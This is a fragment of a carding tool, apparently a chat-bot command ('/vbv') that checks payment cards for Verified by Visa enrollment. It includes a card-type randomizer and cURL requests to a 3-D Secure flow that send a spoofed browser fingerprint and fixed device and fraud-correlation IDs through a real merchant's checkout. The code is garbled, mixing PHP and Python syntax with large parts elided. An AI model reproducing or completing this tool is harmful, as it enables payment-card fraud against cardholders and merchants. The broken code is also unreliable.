        ...
        if (preg_match('/^(\/vbv|\.vbv|!vbv)/', text)) :
                ...
                if (_SERVER['REQUEST_METHOD'] == "POST") :
                        extract(_POST)
                            ...
                            extract(_GET)
                    def inStr(string, start, end, value) :
                    ...
                    def value(str, find_start, find_end) :
                    ...
                    def vbv(input) :
                            ...
                            return output
                    #------[CC Type Randomizer]------#
                    cardNames = ["3" => "American Express", "4" => "Visa", "5" => "MasterCard", "6" => "Discover"]
                ...
                curl_setopt(ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt')
                curl_setopt(ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt')
                curl_setopt(ch, CURLOPT_POSTFIELDS, '{"Cookies":{"Legacy":True,"LocalStorage":True,"SessionStorage":True},"DeviceChannel":"Browser","Extended":{"Browser":{"Adblock":True,"AvailableJsFonts":[],"DoNotTrack":"unknown","JavaEnabled":False},"Device":{"ColorDepth":24,"Cpu":"unknown","Platform":"Win32","TouchSupport":{"MaxTouchPoints":0,"OnTouchStartAvailable":False,"TouchEventCreationSuccessful":False}}},"Fingerprint":"650ee8ce8cff72221cd04b87223780ef","FingerprintingTime":704,"FingerprintDetails":{"Version":"1.5.1"},"Language":"en-US","Latitude":None,"Longitude":None,"OrgUnitId":"5c994f9dccef763068cf8831","Origin":"Songbird","Plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"ReferenceId":"'.Ref.'","Referrer":"https:#www.design911.co.uk/","Screen":{"FakedResolution":False,"Ratio":1.7777777777777777,"Resolution":"1536x864","UsableResolution":"1536x816","CCAScreenSize":"02"},"CallSignEnabled":None,"ThreatMetrixEnabled":False,"ThreatMetrixEventType":"PAYMENT","ThreatMetrixAlias":"Default","TimeOffset":-330,"UserAgent":"Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","UserAgentDetails":{"FakedOS":False,"FakedBrowser":False}}')
                curl8 = curl_exec(ch)
                ...
                curl_setopt(ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt')
                curl_setopt(ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt')
                curl_setopt(ch, CURLOPT_POSTFIELDS, '{"Nonce":"'.nonce.'","DeviceData":"{\"device_session_id\":\"fad45573ff51c341dfaa518b4c789158\",\"fraud_merchant_id\":None,\"correlation_id\":\"fdb202df7b068212814e2de659eb28a3\"}","LocalPaymentID":"","ReferenceID":""}')
                curl11 = curl_exec(ch)
